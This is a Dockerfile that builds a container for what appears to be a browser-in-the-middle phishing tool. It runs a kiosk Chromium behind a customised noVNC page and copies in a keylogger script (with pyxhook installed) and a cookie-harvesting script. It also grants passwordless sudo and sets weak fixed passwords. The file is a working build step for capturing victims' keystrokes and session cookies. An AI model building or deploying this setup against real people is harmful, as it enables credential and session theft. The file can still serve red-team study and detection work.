FROM alpine:3.18
 LABEL maintainer="JoelGMSec - https://darkbyte.net"

ENV DISPLAY :0
ENV RESOLUTION 1920x1080x24
ENV FOLDER default
ENV LANG es-ES.UTF-8
ENV USERAGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"

RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 py3-pip git openssl curl wget gcc libc-dev python3-dev python3-tkinter py3-pycryptodome py3-xlib && \
    rm -f /usr/bin/python && ln -s /usr/bin/python3 /usr/bin/python && \
    pip3 install pyxhook && \
    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs --no-first-run"' >> /etc/chromium/chromium.conf && \
    dbus-uuidgen > /var/lib/dbus/machine-id

RUN adduser -h /home/user -s /bin/bash -S -D user && echo "user:false" | chpasswd && \
    echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers


COPY Files/kiosk.sh /home/user/kiosk.sh
COPY Files/startVNC.sh /home/user/startVNC.sh
RUN chmod +x /home/user/kiosk.sh
RUN chmod +x /home/user/startVNC.sh

USER user
WORKDIR /home/user

RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd && \
    git clone https://github.com/novnc/noVNC.git /home/user/noVNC && \
    pip3 install pycryptodome Crypto && \
    git clone https://github.com/novnc/websockify /home/user/noVNC/utils/websockify && \
    rm -rf /home/user/noVNC/.git && \
    rm -rf /home/user/noVNC/utils/websockify/.git && \
    sudo apk del git

COPY Files/cookies.py /home/user/
COPY Files/vnc_lite.html /home/user/noVNC/
COPY Files/cursor.js /home/user/noVNC/core/util/
RUN sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js

COPY Files/ui.js /home/user/noVNC/app/
COPY Files/kiosk.zip /home/user/
COPY Files/keylogger.py /home/user/


ENTRYPOINT ["/bin/bash","-c", "\
            startVNC () { \
                ./startVNC.sh \"$@\"; \
            }; \"$@\"", "foo"]

EXPOSE 5980
CMD ["startVNC"]
